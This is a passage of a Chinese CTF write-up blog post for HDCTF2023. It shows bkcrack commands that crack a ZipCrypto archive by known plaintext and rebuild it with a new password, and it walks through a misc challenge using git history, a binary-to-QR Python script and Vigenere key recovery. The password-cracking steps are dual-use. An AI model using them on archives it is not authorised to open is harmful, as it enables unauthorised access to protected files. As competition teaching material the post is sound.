+<figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-operator">./</span><span class="hljs-variable">bkcrack</span> <span class="hljs-operator">-</span><span class="hljs-built_in">C</span> <span class="hljs-built_in">Plain</span><span class="hljs-operator">.</span><span class="hljs-variable">zip</span> <span class="hljs-operator">-</span><span class="hljs-variable">c</span> <span class="hljs-string">&quot;secret.txt&quot;</span> <span class="hljs-operator">-</span><span class="hljs-variable">p</span> <span class="hljs-variable">secret</span><span class="hljs-operator">.</span><span class="hljs-variable">txt</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2023/04/23/ybx4SM7QNpPejmv.png" srcset="/img/loading.gif" lazyload alt="image-20230423174819872"></p>
+<p>爆出来3个key，用这些key去产生一个新的压缩包，密码自己设置：</p>
+<figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-variable">bkcrack</span> <span class="hljs-operator">-</span><span class="hljs-built_in">C</span> <span class="hljs-built_in">Plain</span><span class="hljs-operator">.</span><span class="hljs-variable">zip</span> <span class="hljs-operator">-</span><span class="hljs-variable">c</span> <span class="hljs-string">&quot;secret.txt&quot;</span> <span class="hljs-operator">-</span><span class="hljs-variable">k</span> <span class="hljs-variable">ec437a15</span> <span class="hljs-variable">db89e36d</span> <span class="hljs-variable">cd3e8e15</span> <span class="hljs-operator">-</span><span class="hljs-variable">U</span> <span class="hljs-variable">flag</span><span class="hljs-operator">.</span><span class="hljs-variable">zip</span> <span class="hljs-number">123</span><br></code></pre></td></tr></table></figure>
+
+<p>我们使用 <code>-U 参数</code> 生成了一个新的flag.zip压缩包，密码123：</p>
+<p>使用密码打开 <code>flag.txt</code></p>
+<p><img src="https://s2.loli.net/2023/04/23/KhmEnls6vfUA9Jy.png" srcset="/img/loading.gif" lazyload alt="image-20230423175025410"></p>
+<h4 id="SuperMisc"><a href="#SuperMisc" class="headerlink" title="SuperMisc"></a>SuperMisc</h4><p>打开文件夹，发现存在 <code>.git</code> 文件夹，说明使用了git，我们<code>git log</code>查看一下日志：</p>
+<p><img src="https://s2.loli.net/2023/04/24/d4aDEFOrGCnI2Bc.png" srcset="/img/loading.gif" lazyload alt="image-20230424111856953"></p>
+<p>发现存在提交记录，于是我们切换到第二次提交的时候：</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">git <span class="hljs-keyword">reset</span> <span class="hljs-comment">--hard e9286d88c95ab6411b323dca8f358abc3a7e204f</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://s2.loli.net/2023/04/24/2gQl7wZbHjv3Kcn.png" srcset="/img/loading.gif" lazyload alt="image-20230424112004591"></p>
+<p>发现多了一个压缩包 <code>Vigenere.zip</code>,但是不知道密码，于是我们使用010打开png图片：</p>
+<p><img src="https://s2.loli.net/2023/04/24/6CNQvSDTL7zhA3e.png" srcset="/img/loading.gif" lazyload alt="image-20230424112124160"></p>
+<p>发现很多 0、1的二进制数据，我们把它提取出来放到 <code>data.txt</code>中：</p>
+<p><img src="https://s2.loli.net/2023/04/24/QpPNzuAmXBrG6lS.png" srcset="/img/loading.gif" lazyload alt="image-20230424112233522"></p>
+<p>我们猜测这可能需要使用这些0、1组成图片：</p>
+<p>于是我们写个脚本将这些16进制的转化为普通的文本文件<code>out.txt</code>：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;C://Users/LIKE/Desktop/data.txt&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>)<br>fw = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;C://Users/LIKE/Desktop/out.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>)<br>s = <span class="hljs-string">&quot;&quot;</span><br>data = f.read()<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> data:<br>    ch = <span class="hljs-string">&quot;%02x&quot;</span> % i<br>    s += ch<br><br>fw.write(s)<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2023/04/24/1ymDXsz8wGaQ9AM.png" srcset="/img/loading.gif" lazyload alt="image-20230424112501328"></p>
+<p>然后使用python脚本将01转化为图片：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><br>fr = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;C://Users/LIKE/Desktop/out.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>)<br>data = fr.read()<br><br>img = Image.new(<span class="hljs-string">&quot;RGB&quot;</span>, (<span class="hljs-number">1150</span>, <span class="hljs-number">1150</span>))<br><br><span class="hljs-comment"># print(data)</span><br>i = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1150</span>):<br>    <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1150</span>):<br>        <span class="hljs-keyword">if</span> data[i] == <span class="hljs-string">&quot;1&quot;</span>:<br>            img.putpixel((x, y), (<span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>))<br>        <span class="hljs-keyword">elif</span> data[i] == <span class="hljs-string">&quot;0&quot;</span>:<br>            img.putpixel((x, y), (<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>))<br>        i += <span class="hljs-number">1</span><br><br>img.show()<br>img.save(<span class="hljs-string">&quot;flag.png&quot;</span>)<br></code></pre></td></tr></table></figure>
+
+<img src="https://s2.loli.net/2023/04/24/YElLXTxviS9On6a.png" srcset="/img/loading.gif" lazyload alt="flag" style="zoom: 25%;" />
+
+<p>扫描二维码：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">11000</span>#<span class="hljs-number">11111</span>#<span class="hljs-number">10000</span>#<span class="hljs-number">01111</span>#<span class="hljs-number">11000</span>#<span class="hljs-number">00011</span>#<span class="hljs-number">11000</span>#<span class="hljs-number">00011</span>#<span class="hljs-number">00011</span>#<span class="hljs-number">100</span>#<span class="hljs-number">00011</span>#<span class="hljs-number">01111</span>#<span class="hljs-number">10000</span>#<span class="hljs-number">00011</span>#<span class="hljs-number">00011</span>#<span class="hljs-number">00001</span>#<span class="hljs-number">10000</span>#<span class="hljs-number">00111</span>#<span class="hljs-number">00011</span>#<span class="hljs-number">00001</span>#<span class="hljs-number">10000</span>#<span class="hljs-number">00001</span>#<span class="hljs-number">00011</span>#<span class="hljs-number">11111</span>#<span class="hljs-number">00011</span>#<span class="hljs-number">11111</span>#<span class="hljs-number">00111</span>#<span class="hljs-number">100</span>#<span class="hljs-number">00011</span>#<span class="hljs-number">11000</span>#<span class="hljs-number">00011</span>#<span class="hljs-number">00001</span>#<span class="hljs-number">10000</span>#<span class="hljs-number">00001</span>#<span class="hljs-number">10000</span>#<span class="hljs-number">10000</span>#<span class="hljs-number">00111</span>#<span class="hljs-number">100</span>#<span class="hljs-number">00011</span>#<span class="hljs-number">00001</span>#<span class="hljs-number">00011</span>#<span class="hljs-number">00001</span>#<span class="hljs-number">00011</span>#<span class="hljs-number">11110</span>#<span class="hljs-number">00011</span>#<span class="hljs-number">00111</span>#<span class="hljs-number">00111</span>#<span class="hljs-number">100</span>#<span class="hljs-number">10000</span>#<span class="hljs-number">00111</span>#<span class="hljs-number">00011</span>#<span class="hljs-number">11111</span>#<span class="hljs-number">00011</span>#<span class="hljs-number">00001</span>#<span class="hljs-number">00011</span>#<span class="hljs-number">11110</span>#<span class="hljs-number">00111</span>#<span class="hljs-number">100</span>#<span class="hljs-number">00011</span>#<span class="hljs-number">00000</span>#<span class="hljs-number">00011</span>#<span class="hljs-number">11100</span>#<span class="hljs-number">00011</span>#<span class="hljs-number">00111</span>#<span class="hljs-number">10000</span>#<span class="hljs-number">00000</span>#<span class="hljs-number">10000</span>#<span class="hljs-number">00000</span>#<span class="hljs-number">00011</span>#<span class="hljs-number">11100</span>#<span class="hljs-number">00011</span>#<span class="hljs-number">00011</span>#<span class="hljs-number">00011</span>#<span class="hljs-number">11111</span>#<span class="hljs-number">00011</span>#<span class="hljs-number">11110</span>#<span class="hljs-number">10000</span>#<span class="hljs-number">00000</span>#<span class="hljs-number">00011</span>#<span class="hljs-number">10000</span>#<span class="hljs-number">00011</span>#<span class="hljs-number">00000</span><br></code></pre></td></tr></table></figure>
+
+<p>使用 0、1、#  3中字符组成，猜测这应该是莫斯密码：</p>
+<img src="https://s2.loli.net/2023/04/24/nN4T6iSy9M3DHCY.png" srcset="/img/loading.gif" lazyload alt="image-20230424112703479" style="zoom:33%;" />
+
+<p>然后将16进制转为字符串：</p>
+<p><img src="https://s2.loli.net/2023/04/24/E7ZV2Hvc1bNsSoq.png" srcset="/img/loading.gif" lazyload alt="image-20230424112728145"></p>
+<p>获得压缩包密码，解密获得 <code>Vigenere</code> 文件：</p>
+<p>我们使用 <code>file</code>命令查看一下是什么文件：</p>
+<p><img src="https://s2.loli.net/2023/04/24/rJQ4NvpdW2qw7bz.png" srcset="/img/loading.gif" lazyload alt="image-20230424113112354"></p>
+<p>在010中打开得到字符串：</p>
+<p><img src="https://s2.loli.net/2023/04/24/idZaephToUvDLnk.png" srcset="/img/loading.gif" lazyload alt="image-20230424113413288"></p>
+<p>或者 <code>strings</code>：</p>
+<p><img src="https://s2.loli.net/2023/04/24/wJNdqZlxGfjOgnM.png" srcset="/img/loading.gif" lazyload alt="image-20230424113438992"></p>
+<p>然后结合文件名，知道是<code>维吉尼亚密码</code>，但是需要密钥</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/Byxs20/Vigenere-Tools">使用大佬脚本根据明文爆破密钥</a></p>
+<p><img src="https://s2.loli.net/2023/04/24/9b837dPALXVORsz.png" srcset="/img/loading.gif" lazyload alt="image-20230424114943236"></p>
+<p>获得密钥 <code>IBFQW</code>:</p>
+<p><img src="https://s2.loli.net/2023/04/24/oOVudAp26UGvFlM.png" srcset="/img/loading.gif" lazyload alt="image-20230424115032601"></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/CTF/" class="category-chain-item">CTF</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/HDCTF2023/" class="print-no-link">#HDCTF2023</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>HDCTF2023</div>
+      <div>https://leekosss.github.io/2023/08/24/HDCTF2023/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>leekos</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年8月24日</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>更新于</div>
+          <div>2023年6月5日</div>
+        </div>
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/08/24/hello-world/" title="Hello World">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Hello World</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/08/24/GetShell/" title="GetShell">
+                        <span class="hidden-mobile">GetShell</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"e5J90iDkXMWhU5UNlEX1I2hO-gzGzoHsz","appKey":"esLROw9j3xLk2nV4tQkKaih1","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+    <!-- 备案信息 ICP for China -->
+    <div class="beian">
+  <span>
+    <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
+      赣ICP备2022008842号-2
+    </a>
+  </span>
+  
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
